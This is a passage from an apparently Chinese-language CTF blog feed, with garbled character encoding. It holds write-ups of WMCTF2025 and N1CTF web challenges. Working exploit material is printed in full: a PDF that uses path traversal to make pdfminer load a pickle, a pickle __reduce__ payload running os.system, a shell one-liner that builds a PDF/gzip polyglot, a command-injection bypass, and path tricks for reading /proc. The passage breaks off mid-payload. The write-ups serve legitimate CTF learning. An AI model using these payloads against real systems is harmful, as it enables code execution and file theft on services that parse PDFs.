    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="/2025/09/23/WMCTF2025/#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬é¢˜çš„åŠŸèƒ½ç‚¹æ˜¯ä¸€ä¸ªå°†pdfè½¬æ¢ä¸ºtxtçš„ç½‘ç«™ï¼Œä¿®å¤æ–¹å¼æ˜¯æŠŠpickleæ¢æˆäº†marshal</p><h1 id="åˆ†æè°ƒç”¨é“¾"><a href="/2025/09/23/WMCTF2025/#åˆ†æè°ƒç”¨é“¾" class="headerlink" title="åˆ†æè°ƒç”¨é“¾"></a>åˆ†æè°ƒç”¨é“¾</h1><p>è¿™é¢˜è€ƒå¯Ÿpickleååºåˆ—åŒ–ï¼Œé¦–å…ˆåœ¨pdfmineråº“é‡Œæœç´¢pickle.loads</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_load_data</span>(<span class="hljs-params">cls, name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Any</span>:<br>    name = name.replace(<span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    filename = <span class="hljs-string">&quot;%s.pickle.gz&quot;</span> % name<br>    log.debug(<span class="hljs-string">&quot;loading: %r&quot;</span>, name)<br>    cmap_paths = (<br>        os.environ.get(<span class="hljs-string">&quot;CMAP_PATH&quot;</span>, <span class="hljs-string">&quot;/usr/share/pdfminer/&quot;</span>),<br>        os.path.join(os.path.dirname(__file__), <span class="hljs-string">&quot;cmap&quot;</span>),<br>    )<br>    <span class="hljs-keyword">for</span> directory <span class="hljs-keyword">in</span> cmap_paths:<br>        path = os.path.join(directory, filename)<br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            gzfile = gzip.<span class="hljs-built_in">open</span>(path)<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(name), (), pickle.loads(gzfile.read()))<br>            <span class="hljs-keyword">finally</span>:<br>                gzfile.close()<br>    <span class="hljs-keyword">raise</span> CMapDB.CMapNotFound(name)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œååºåˆ—åŒ–çš„æ•°æ®æ˜¯é»˜è®¤çš„cmapç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚æœèƒ½è®©ä»–å˜æˆæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶å°±èƒ½å¤Ÿå®ç°rce</p><p>æ³¨æ„åˆ°pathé‡Œé¢çš„filenameæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå¦‚æœèƒ½ç›®å½•ç©¿è¶Šåˆ°æˆ‘ä»¬å¯æ§çš„ç›®å½•å°±å¯ä»¥äº†ï¼Œå¾€ä¸Šå¯»æ‰¾çœ‹çœ‹æ˜¯ä»å“ªé‡Œè°ƒç”¨è¿‡æ¥çš„</p><p><img src="/2025/09/23/WMCTF2025/image-20250923130848407.png" alt="image-20250923130848407"></p><p>å‘ç°æœ‰ä¸¤ä¸ªåœ°æ–¹è°ƒç”¨äº†_load_dataå‡½æ•°ï¼Œä½†æ˜¯get_unicode_map è°ƒç”¨çš„æ—¶å€™å‰ç¼€æ˜¯å†™æ­»çš„æ— æ³•è¿›è¡Œç›®å½•ç©¿è¶Š</p><p>æ‰€ä»¥åªèƒ½æ˜¯get_cmap,ç»§ç»­çœ‹</p><p><img src="/2025/09/23/WMCTF2025/image-20250923131155099.png" alt="image-20250923131155099"></p><p>æ‰¾åˆ°è¿™é‡Œï¼Œå†ç»§ç»­çœ‹get_cmap_from_spec</p><p><img src="/2025/09/23/WMCTF2025/image-20250923131249192.png" alt="image-20250923131249192"></p><p>æ˜¯PDFCIDFontç±»åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨çš„ï¼Œç»§ç»­çœ‹</p><p><img src="/2025/09/23/WMCTF2025/image-20250923131416719.png" alt="image-20250923131416719"></p><p><img src="/2025/09/23/WMCTF2025/image-20250923131448101.png" alt="image-20250923131448101"></p><p>å…¶å®åˆ°è¿™é‡Œå·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯åœ¨å¤„ç†CIDFontå­—ä½“çš„æ—¶å€™è°ƒç”¨çš„ï¼Œä½†æ˜¯è¿˜æ˜¯ç»§ç»­çœ‹å®Œ</p><p><img src="/2025/09/23/WMCTF2025/image-20250923131557145.png" alt="image-20250923131557145"></p><p><img src="/2025/09/23/WMCTF2025/image-20250923131620302.png" alt="image-20250923131620302"></p><p><img src="/2025/09/23/WMCTF2025/image-20250923131635382.png" alt="image-20250923131635382"></p><p><img src="/2025/09/23/WMCTF2025/image-20250923131648622.png" alt="image-20250923131648622"></p><p>æ‰¾åˆ°äº†å…¥å£å‡½æ•°extract_pages</p><p>é‚£ä¹ˆæ•´ä¸ªè¿‡ç¨‹å°±æ¸…æ™°äº†ï¼Œå°±æ˜¯å½“ä¸€é¡µpdfé‡Œé¢å­˜åœ¨CIDFontå­—ä½“çš„æ—¶å€™å°±ä¼šå®ä¾‹åŒ–ä¸€ä¸ªPDFCIDFontå¯¹è±¡æ¥å¤„ç†ï¼Œæœ€åè°ƒåˆ°äº†pcikle.loads</p><p><img src="/2025/09/23/WMCTF2025/image-20250923132114656.png" alt="image-20250923132114656"></p><p>è¿™ä¸ªå‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°ï¼Œnameæ˜¯é€šè¿‡Encodingè·å–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨pdfä¸­æ’å…¥ä¸€ä¸ªCIDFontå­—ä½“å¹¶ä¸”æŒ‡å®šEncodingå°±å¯ä»¥ååºåˆ—åŒ–æˆ‘ä»¬å¯æ§çš„æ–‡ä»¶</p><h1 id="æ„é€ æ¶æ„æ–‡ä»¶"><a href="/2025/09/23/WMCTF2025/#æ„é€ æ¶æ„æ–‡ä»¶" class="headerlink" title="æ„é€ æ¶æ„æ–‡ä»¶"></a>æ„é€ æ¶æ„æ–‡ä»¶</h1><p>pdfç›´æ¥è®©aiç”Ÿæˆå°±è¡Œäº†ï¼Œå†è‡ªå·±æ”¹ä¸€ä¸‹Encoding  ï¼ˆå¸®æˆ‘ç”Ÿæˆä¸€ä¸ªç®€å•çš„pdfæ–‡ä»¶ï¼Œå£°æ˜CIDFontå­—ä½“ï¼Œä»¥çº¯æ–‡æœ¬å½¢å¼è¾“å‡ºï¼‰</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">%PDF-1.4<br>1 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Catalog</span><br>  <span class="hljs-string">/Pages</span> 2 0 R<br>&gt;&gt;<br>endobj<br><br>2 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Pages</span><br>  <span class="hljs-string">/Count</span> 1<br>  <span class="hljs-string">/Kids</span> [3 0 R]<br>&gt;&gt;<br>endobj<br><br>3 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Page</span><br>  <span class="hljs-string">/Parent</span> 2 0 R<br>  <span class="hljs-string">/MediaBox</span> [0 0 595 842]<br>  <span class="hljs-string">/Resources</span> &lt;&lt;<br>    <span class="hljs-string">/Font</span> &lt;&lt;<br>      <span class="hljs-string">/F1</span> 4 0 R<br>    &gt;&gt;<br>  &gt;&gt;<br>  <span class="hljs-string">/Contents</span> 5 0 R<br>&gt;&gt;<br>endobj<br><br>4 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Font</span><br>  <span class="hljs-string">/Subtype</span> <span class="hljs-string">/Type0</span><br>  <span class="hljs-string">/BaseFont</span> <span class="hljs-string">/Adobe-GB1</span><br>  <span class="hljs-string">/Encoding</span> <span class="hljs-string">/..</span><span class="hljs-comment">#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Fpickle</span><br>  <span class="hljs-string">/DescendantFonts</span> [6 0 R]<br>&gt;&gt;<br>endobj<br><br>6 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Font</span><br>  <span class="hljs-string">/Subtype</span> <span class="hljs-string">/CIDFontType0</span><br>  <span class="hljs-string">/BaseFont</span> <span class="hljs-string">/Adobe-GB1</span><br>  <span class="hljs-string">/CIDSystemInfo</span> &lt;&lt;<br>    <span class="hljs-string">/Registry</span> <span class="hljs-params">(Adobe)</span><br>    <span class="hljs-string">/Ordering</span> <span class="hljs-params">(GB1)</span><br>    <span class="hljs-string">/Supplement</span> 0<br>  &gt;&gt;<br>&gt;&gt;<br>endobj<br><br>5 0 obj<br>&lt;&lt; <span class="hljs-string">/Length</span> 32 &gt;&gt;<br>stream<br>BT<br><span class="hljs-string">/F1</span> 24 Tf<br>100 700 Td<br><span class="hljs-params">(A)</span> Tj<br>ET<br>endstream<br>endobj<br><br>xref<br>0 7<br>0000000000 65535 f<br>0000000010 00000 n<br>0000000058 00000 n<br>0000000115 00000 n<br>0000000252 00000 n<br>0000000375 00000 n<br>0000000534 00000 n<br>trailer<br>&lt;&lt;<br>  <span class="hljs-string">/Root</span> 1 0 R<br>  <span class="hljs-string">/Size</span> 7<br>&gt;&gt;<br>startxref<br>620<br>%%EOF<br><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œ&#x2F;è¦16è¿›åˆ¶ç¼–ç ä¸€ä¸‹ï¼Œååºåˆ—åŒ–çš„æ–‡ä»¶å°±å˜æˆäº†&#x2F;app&#x2F;uploads&#x2F;pickle.pickle.gz</p><p>æˆ‘ä»¬åªéœ€è¦æŠŠåºåˆ—åŒ–åçš„æ•°æ®å­˜åˆ°è¿™ä¸ªgzæ–‡ä»¶é‡Œå°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tmp</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;mkdir ./static;cat /flag &gt; /app/static/1.txt&quot;</span>,))<br><br>obj = Tmp()<br>ser_data = pickle.dumps(obj)<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œè¿™é¢˜åªèƒ½ä¸Šä¼ pdfï¼Œå¦‚æœä¸æ˜¯pdfçš„æ ¼å¼æ‰§è¡Œåˆ°è¿™æ®µä»£ç çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œå¯¼è‡´æ–‡ä»¶ä¸ä¼šå†™å…¥åˆ°uploadsç›®å½•ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># just if is a pdf</span><br>    parser = PDFParser(io.BytesIO(pdf_content))<br>    doc = PDFDocument(parser)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(e), <span class="hljs-number">500</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ä¸ªè§£å†³åŠæ³•</p><ol><li>åˆ©ç”¨gzæ–‡ä»¶çš„æ ¼å¼</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">gzipæ–‡ä»¶æ ¼å¼å¯ä»¥åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†ï¼š<br><br>æ–‡ä»¶å¤´å¿…é€‰éƒ¨åˆ†<span class="hljs-selector-attr">[10ä¸ªå­—èŠ‚]</span><br>æ–‡ä»¶å¤´å¯é€‰éƒ¨åˆ†<span class="hljs-selector-attr">[0-Nå­—èŠ‚]</span><br>æ•°æ®éƒ¨åˆ†<br>æ–‡ä»¶å°¾éƒ¨åˆ†<span class="hljs-selector-attr">[8ä¸ªå­—èŠ‚]</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠpdfæ–‡ä»¶å°¾å†™åˆ°gzçš„æ–‡ä»¶å¤´å¯é€‰éƒ¨åˆ†ï¼Œpickleçš„æ•°æ®å†™åˆ°æ•°æ®éƒ¨åˆ†ï¼Œè¿™æ ·åœ¨ååºåˆ—åŒ–çš„æ—¶å€™åªä¼šååºåˆ—åŒ–pickleæ•°æ®ï¼Œï¼ˆpdfåªè¦æœ‰æ–‡ä»¶å°¾å°±å¯ä»¥è¯†åˆ«æˆåŠŸï¼‰</p><p>å¯ä»¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;gASVHgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=&quot;</span> | <span class="hljs-built_in">base64</span> -d | pigz --fast --comment $<span class="hljs-string">&#x27;\ntrailer\n&lt;&lt; /Root 1 0 R /Size 1 &gt;&gt;\nstartxref\n&#x27;</span> &gt; pickle.pickle.gz<br></code></pre></td></tr></table></figure><ol start="2"><li>åˆ©ç”¨gzçš„compresslevelå‚æ•°</li></ol><p>åœ¨gzipå‹ç¼©æ–‡ä»¶æ—¶ï¼Œå¦‚æœæŒ‡å®šäº†compresså‚æ•°ç­‰äº0ï¼Œå°±ä¼šä¸å‹ç¼©æ•°æ®ï¼Œåªä¸ºæ–‡ä»¶æ·»åŠ gzæ ¼å¼ï¼Œè¿™æ ·pdfåœ¨gzæ–‡ä»¶å†…å°±èƒ½ä¿æŒå‘½ä»¤ï¼Œä¹Ÿå°±å¯ä»¥è¯†åˆ«æˆåŠŸï¼Œæ‰€ä»¥åªéœ€è¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> gzip.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pickle.pickle1.gz&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>,compresslevel=<span class="hljs-number">0</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ser_data)<br>    f.write(pdf_content)<br></code></pre></td></tr></table></figure><h1 id="æ”»å‡»"><a href="/2025/09/23/WMCTF2025/#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h1><p>å…ˆæŠŠpickle.pickle.gzä¼ ä¸Šå»ï¼Œå†æŠŠpdfä¼ ä¸Šå»å°±è¡Œäº†ï¼Œæ— å›æ˜¾ä¸å‡ºç½‘å¯ä»¥å†™é™æ€æ–‡ä»¶æˆ–è€…é€šè¿‡æŠ¥é”™å¸¦å‡ºæ¥</p>]]></content>
    
    
    
    <tags>
      
      <tag>pickleååºåˆ—åŒ–</tag>
      
      <tag>gzæ–‡ä»¶çš„ç‰¹æ€§</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n1ctf_web_wp</title>
    <link href="/2025/09/15/n1ctf-web-wp/"/>
    <url>/2025/09/15/n1ctf-web-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="ping"><a href="/2025/09/15/n1ctf-web-wp/#ping" class="headerlink" title="ping"></a>ping</h1><p>åˆ†æä»£ç ï¼Œæ˜¾ç„¶éœ€è¦åœ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">command = <span class="hljs-string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="hljs-subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåªéœ€è¦è®©$(echo â€˜{ip_base64}â€™ | base64 -d)  â€“&gt;    127.0.0.1;whoami  æ‹¼æ¥ä¸€ä¸‹å³å¯</p><p>ä½†æ˜¯ç”±äºå‰é¢çš„æ­£åˆ™åŒ¹é…ç­‰ä¸¥æ ¼è¦æ±‚äº†è§£ç åå¿…é¡»æ˜¯ipçš„æ ¼å¼ï¼Œæ‰€ä»¥åªèƒ½è¿›è¡Œç»•è¿‡</p><p>å°è¯•ç»•è¿‡æ­£åˆ™æ— æœ   è§‚å¯Ÿåˆ°æ˜æ˜ä¸€å¼€å§‹å°±å¯¹ip_base64è¿›è¡Œäº†ä¸€æ¬¡base64è§£ç ï¼Œä½†æ˜¯åœ¨å‘½ä»¤æ‰§è¡Œçš„æ—¶å€™æ˜æ˜å¯ä»¥ç›´æ¥ä½¿ç”¨å´è¿˜è¦è§£ç ä¸€æ¬¡ï¼ŒçŒœæµ‹æ˜¯ä¸¤ç§è§£ç æ–¹å¼çš„å·®å¼‚</p><p>æ€è·¯æ˜¯è®©pythonçš„base64.b64decode()å‡½æ•°åªè§£æå‡ºå‰é¢çš„ipåœ°å€ï¼Œè€Œbashåœ¨base64 -d çš„æ—¶å€™è§£æå‡ºå®Œæ•´çš„æ‹¼æ¥åçš„å‘½ä»¤</p><p>åˆ†æpython b64decodeå‡½æ•°çš„æºç å‘ç°åº•å±‚ç”±cå®ç°ï¼Œæ³¨æ„åˆ°å¦‚ä¸‹ä»£ç </p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250914232153626.png" alt="image-20250914232153626"></p><p>ä¹Ÿå°±æ˜¯å½“pythonè§£æåˆ°&#x3D;&#x3D;ä¹‹åå¦‚æœåé¢è¿˜æœ‰å†…å®¹ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ä¼šæŠ¥é”™ï¼Œè€Œéä¸¥æ ¼æ¨¡å¼ä¸‹ä¼šåœæ­¢è§£æä½†ä¸ä¼šæŠ¥é”™ï¼Œå¯ä»¥è¯•éªŒä¸€ä¸‹</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250914232401063.png" alt="image-20250914232401063"></p><p>pythonæˆåŠŸåªè§£ç å‡ºäº†1.1.1.1ï¼Œè€Œbashå´èƒ½è§£æå‡ºå®Œæ•´çš„å‘½ä»¤</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250914232507326.png" alt="image-20250914232507326"></p><p>åˆ©ç”¨è¿™ä¸ªå°±èƒ½ç»•è¿‡æ£€æµ‹å¹¶ä¸”æ‹¼æ¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œç›´æ¥cat &#x2F;flagå³å¯ï¼Œå¦‚ä¸‹å›¾</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250914234321695.png" alt="image-20250914234321695"></p><h1 id="Peek-a-Fork"><a href="/2025/09/15/n1ctf-web-wp/#Peek-a-Fork" class="headerlink" title="Peek a Fork"></a>Peek a Fork</h1><p>ä»£ç å®¡è®¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br>mm = mmap.mmap(-<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(flag))<br>mm.write(flag)<br>os.remove(<span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>flagæ”¾åˆ°äº†åŒ¿åè¿›ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡è¯»å–&#x2F;proc&#x2F;self&#x2F;memå‡½æ•°è¯»å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename:<br>            response_body = PAGE<br>            response_status = <span class="hljs-string">&quot;200 OK&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.normpath(filename), <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">if</span> offset &gt; <span class="hljs-number">0</span>:<br>                        f.seek(offset)<br>                    <br>                    data_bytes = f.read(length)<br> <br>                    response_body = data_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                response_status = <span class="hljs-string">&quot;200 OK&quot;</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><br>                response_body = <span class="hljs-string">f&quot;Invalid path&quot;</span><br>                response_status = <span class="hljs-string">&quot;500 Internal Server Error&quot;</span><br><br>        response = <span class="hljs-string">f&quot;HTTP/1.1 <span class="hljs-subst">&#123;response_status&#125;</span>\r\nContent-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(response_body)&#125;</span>\r\n\r\n<span class="hljs-subst">&#123;response_body&#125;</span>&quot;</span><br>        conn.sendall(response.encode())<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è¯»æ–‡ä»¶ï¼Œæ‰¾ä¸€ä¸‹filenameçš„å®šä¹‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    path = request_data.split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">1</span>]<br>    pattern = <span class="hljs-string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span><br>    <br>    offset = <span class="hljs-number">0</span><br>    length = -<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">match</span> = re.search(pattern, path)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        offset = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).decode())<br>        length = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>).decode())<br>        <br>        clean_path = re.sub(pattern, <span class="hljs-string">b&#x27;&#x27;</span>, path)<br>        filename = clean_path.strip(<span class="hljs-string">b&#x27;/&#x27;</span>).decode()<br>    <span class="hljs-keyword">else</span>:<br>        filename = path.strip(<span class="hljs-string">b&#x27;/&#x27;</span>).decode()<br><br><span class="hljs-keyword">except</span> Exception:<br>    response = <span class="hljs-string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span><br>    conn.sendall(response)<br>    <span class="hljs-keyword">return</span><br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè·å–clean_pathçš„é€»è¾‘æ˜¯å…ˆåŒ¹é…åˆ°?offset&#x3D;(\d+)&amp;length&#x3D;(\d+)ï¼Œç„¶åä»pathé‡Œé¢æŠŠè¿™ä¸€æ•´ä¸²ç»™å»é™¤æ‰</p><p>ç„¶åå»é™¤æ‰é¦–å°¾çš„&#x2F;å¾—åˆ°filename</p><p>æ¼æ´ç‚¹åœ¨äºwafæ˜¯åœ¨mainå‡½æ•°ä¸­è·å–åˆ°åˆå§‹æ•°æ®çš„æ—¶å€™å°±ç›´æ¥æ£€æµ‹çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(term <span class="hljs-keyword">in</span> initial_data.lower() <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> FORBIDDEN):<br>    conn.sendall(<span class="hljs-string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)<br>    conn.close()<br>    <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨è¿™ç§æƒ…å†µ</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">path</span> = rb<span class="hljs-string">&quot;/pro?offset=1&amp;length=1c&quot;</span><br><span class="hljs-attr">clean_path</span> = b<span class="hljs-string">&quot;/proc&quot;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;proc&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡é»‘åå•ä¼ å…¥procäº†ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯procåœ¨æ ¹ç›®å½•æ‰€ä»¥è¦ç©¿è¶Šä¸€ä¸‹</p><p>åˆ©ç”¨ç›¸åŒçš„åŸç†ç»•è¿‡.. å’Œ.&#x2F;çš„é™åˆ¶</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile">path=rb<span class="hljs-string">&quot;?offset=0&amp;length=100000.?offset=0&amp;length=100000.?offset=0&amp;length=100000/pro?</span><br><span class="hljs-string">offset=0&amp;length=100000c/self/environ&quot;</span><br><br>clean_path = b<span class="hljs-string">&quot;../proc/self/environ&quot;</span><br>filename= <span 